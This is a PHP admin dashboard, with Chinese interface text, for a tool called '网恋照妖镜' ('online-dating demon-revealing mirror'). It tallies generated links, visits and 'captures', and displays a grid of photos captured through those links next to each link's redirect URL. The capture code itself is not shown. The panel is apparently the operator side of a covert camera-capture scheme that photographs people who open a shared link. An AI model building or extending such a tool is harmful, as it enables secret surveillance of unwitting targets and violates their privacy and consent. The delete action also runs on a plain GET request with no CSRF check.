<?php
/**
 * Online-Mirror 升级版 - 管理后台
 */
require_once __DIR__ . '/config.php';
requireLogin();

$db = getDB();
$user = getCurrentUser();

// 获取统计数据
$total_links = $db->query("SELECT COUNT(*) FROM links")->fetchColumn();
$total_photos = $db->query("SELECT COUNT(*) FROM photos")->fetchColumn();
$total_views = $db->query("SELECT SUM(views) FROM links")->fetchColumn() ?: 0;
$total_captures = $db->query("SELECT SUM(captures) FROM links")->fetchColumn() ?: 0;

// 今日数据
$today_start = date('Y-m-d 00:00:00');
$today_photos = $db->prepare("SELECT COUNT(*) FROM photos WHERE created_at >= ?");
$today_photos->execute([$today_start]);
$today_photos = $today_photos->fetchColumn();

$today_visits = $db->prepare("SELECT COUNT(*) FROM logs WHERE action='visit' AND created_at >= ?");
$today_visits->execute([$today_start]);
$today_visits = $today_visits->fetchColumn();

// 获取最近链接
$stmt = $db->query("SELECT * FROM links ORDER BY created_at DESC LIMIT 20");
$recent_links = $stmt->fetchAll();

// 获取最近照片
$stmt = $db->prepare("SELECT p.*, l.redirect_url FROM photos p LEFT JOIN links l ON p.link_id = l.link_id ORDER BY p.created_at DESC LIMIT 12");
$stmt->execute();
$recent_photos = $stmt->fetchAll();

// 删除链接
if (isset($_GET['delete_link']) && $user['role'] === 'admin') {
    $link_id = trim($_GET['delete_link']);
    $stmt = $db->prepare("SELECT file_path FROM photos WHERE link_id = ?");
    $stmt->execute([$link_id]);
    foreach ($stmt->fetchAll() as $p) {
        $fp = IMG_DIR . $p['file_path'];
        if (file_exists($fp)) unlink($fp);
    }
    $stmt = $db->prepare("DELETE FROM links WHERE link_id = ?");
    $stmt->execute([$link_id]);
    addLog($link_id, 'delete_link');
    header("Location: dashboard.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>控制台 · 网恋照妖镜</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #0f0c29;
    color: #e0e0e0;
    min-height: 100vh;
}

/* 顶栏 */
.topbar {
    background: rgba(255,255,255,0.04);
    backdrop-filter: blur(20px);
    border-bottom: 1px solid rgba(255,255,255,0.08);
    padding: 16px 24px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 12px;
    position: sticky;
    top: 0;
    z-index: 10;
}
.topbar .brand {
    font-size: 20px;
    font-weight: 700;
    background: linear-gradient(90deg, #667eea, #764ba2);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    display: flex;
    align-items: center;
    gap: 8px;
}
.topbar .nav {
    display: flex;
    gap: 8px;
    align-items: center;
}
.topbar .nav a {
    padding: 8px 16px;
    border-radius: 8px;
    text-decoration: none;
    font-size: 13px;
    transition: all 0.3s;
    color: #a0a0b8;
}
.topbar .nav a:hover { background: rgba(255,255,255,0.06); color: #e0e0e0; }
.topbar .nav a.active { background: rgba(102,126,234,0.15); color: #667eea; }
.topbar .nav a.logout { color: #ff6b6b; }

.container { max-width: 1200px; margin: 0 auto; padding: 24px; }

/* 统计卡片 */
.stats-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
    gap: 16px;
    margin-bottom: 28px;
}
.stat-card {
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 16px;
    padding: 20px;
    text-align: center;
    transition: all 0.3s;
}
.stat-card:hover { transform: translateY(-2px); border-color: rgba(102,126,234,0.3); }
.stat-card .num {
    font-size: 32px;
    font-weight: 700;
    background: linear-gradient(135deg, #667eea, #764ba2);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.stat-card .label { font-size: 13px; color: #8080a0; margin-top: 6px; }

/* 区域标题 */
.section-title {
    font-size: 18px;
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    gap: 8px;
}

/* 表格 */
.table-wrap {
    overflow-x: auto;
    background: rgba(255,255,255,0.03);
    border: 1px solid rgba(255,255,255,0.06);
    border-radius: 16px;
    margin-bottom: 28px;
}
table {
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
}
table th {
    text-align: left;
    padding: 14px 16px;
    background: rgba(255,255,255,0.04);
    color: #8080a0;
    font-weight: 500;
    font-size: 12px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    border-bottom: 1px solid rgba(255,255,255,0.06);
}
table td {
    padding: 12px 16px;
    border-bottom: 1px solid rgba(255,255,255,0.04);
    color: #c0c0d0;
}
table tr:hover td { background: rgba(255,255,255,0.03); }
table td .badge {
    display: inline-block;
    padding: 2px 8px;
    border-radius: 4px;
    font-size: 11px;
}
.badge-active { background: rgba(76,175,80,0.15); color: #4caf50; }
.badge-expired { background: rgba(255,152,0,0.15); color: #ff9800; }
.badge-disabled { background: rgba(255,80,80,0.15); color: #ff6b6b; }
table td a { color: #667eea; text-decoration: none; }
table td a:hover { text-decoration: underline; }
table td .action-link { margin: 0 4px; }

/* 最近照片网格 */
.photo-mini-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
    gap: 12px;
    margin-bottom: 28px;
}
.photo-mini {
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 12px;
    overflow: hidden;
    transition: all 0.3s;
}
.photo-mini:hover { transform: translateY(-2px); border-color: rgba(102,126,234,0.3); }
.photo-mini img {
    width: 100%;
    aspect-ratio: 3/4;
    object-fit: cover;
    display: block;
    background: #111;
}
.photo-mini .info {
    padding: 8px 10px;
    font-size: 11px;
    color: #8080a0;
}

@media (max-width: 640px) {
    .container { padding: 16px; }
    .stats-grid { grid-template-columns: 1fr 1fr; }
    .photo-mini-grid { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); }
}
</style>
</head>
<body>
<div class="topbar">
    <div class="brand">
        <i class="fas fa-camera"></i> 网恋照妖镜
    </div>
    <div class="nav">
        <a href="index.php"><i class="fas fa-home"></i> 首页</a>
        <a href="dashboard.php" class="active"><i class="fas fa-tachometer-alt"></i> 控制台</a>
        <a href="login.php?action=logout" class="logout"><i class="fas fa-sign-out-alt"></i> 退出 (<?php echo htmlspecialchars($user['username']); ?>)</a>
    </div>
</div>

<div class="container">
    <div class="stats-grid">
        <div class="stat-card">
            <div class="num"><?php echo $total_links; ?></div>
            <div class="label">🔗 链接数</div>
        </div>
        <div class="stat-card">
            <div class="num"><?php echo $total_photos; ?></div>
            <div class="label">📸 照片总数</div>
        </div>
        <div class="stat-card">
            <div class="num"><?php echo $total_views; ?></div>
            <div class="label">👁️ 总访问</div>
        </div>
        <div class="stat-card">
            <div class="num"><?php echo $today_visits; ?></div>
            <div class="label">📊 今日访问</div>
        </div>
        <div class="stat-card">
            <div class="num"><?php echo $today_photos; ?></div>
            <div class="label">📷 今日拍照</div>
        </div>
        <div class="stat-card">
            <div class="num"><?php echo $total_captures; ?></div>
            <div class="label">🎯 总捕获</div>
        </div>
    </div>

    <h3 class="section-title"><i class="fas fa-link"></i> 最近链接</h3>
    <?php if (empty($recent_links)): ?>
    <p style="color:#8080a0;padding:20px;text-align:center;">暂无链接，去首页生成一个吧～</p>
    <?php else: ?>
    <div class="table-wrap">
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>跳转地址</th>
                    <th>访问/捕获</th>
                    <th>状态</th>
                    <th>创建时间</th>
                    <th>操作</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($recent_links as $link): ?>
                <tr>
                    <td><code><?php echo htmlspecialchars($link['link_id']); ?></code></td>
                    <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
                        <a href="<?php echo htmlspecialchars($link['redirect_url']); ?>" target="_blank"><?php echo htmlspecialchars(mb_substr($link['redirect_url'], 0, 40)); ?></a>
                    </td>
                    <td><?php echo $link['views']; ?> / <?php echo $link['captures']; ?></td>
                    <td>
                        <?php if ($link['status'] === 'active'): ?>
                            <span class="badge badge-active">活跃</span>
                        <?php elseif ($link['status'] === 'expired'): ?>
                            <span class="badge badge-expired">过期</span>
                        <?php else: ?>
                            <span class="badge badge-disabled">禁用</span>
                        <?php endif; ?>
                    </td>
                    <td><?php echo date('m-d H:i', strtotime($link['created_at'])); ?></td>
                    <td>
                        <a href="photos.php?id=<?php echo urlencode($link['link_id']); ?>" class="action-link"><i class="fas fa-images"></i></a>
                        <?php if ($user['role'] === 'admin'): ?>
                        <a href="?delete_link=<?php echo urlencode($link['link_id']); ?>" class="action-link" style="color:#ff6b6b;" onclick="return confirm('删除此链接及所有照片？')"><i class="fas fa-trash"></i></a>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <?php endif; ?>

    <h3 class="section-title"><i class="fas fa-clock"></i> 最近捕获照片</h3>
    <?php if (empty($recent_photos)): ?>
    <p style="color:#8080a0;padding:20px;text-align:center;">暂无照片，等待捕获...</p>
    <?php else: ?>
    <div class="photo-mini-grid">
        <?php foreach ($recent_photos as $p): ?>
        <div class="photo-mini">
            <a href="photos.php?id=<?php echo urlencode($p['link_id']); ?>">
                <img src="img/<?php echo htmlspecialchars($p['file_path']); ?>" alt="照片" loading="lazy">
            </a>
            <div class="info">
                <div><i class="far fa-clock"></i> <?php echo date('m-d H:i', strtotime($p['created_at'])); ?></div>
                <div style="font-size:10px;color:#606080;">ID: <?php echo htmlspecialchars($p['link_id']); ?></div>
            </div>
        </div>
        <?php endforeach; ?>
    </div>
    <?php endif; ?>
</div>
</body>
</html>
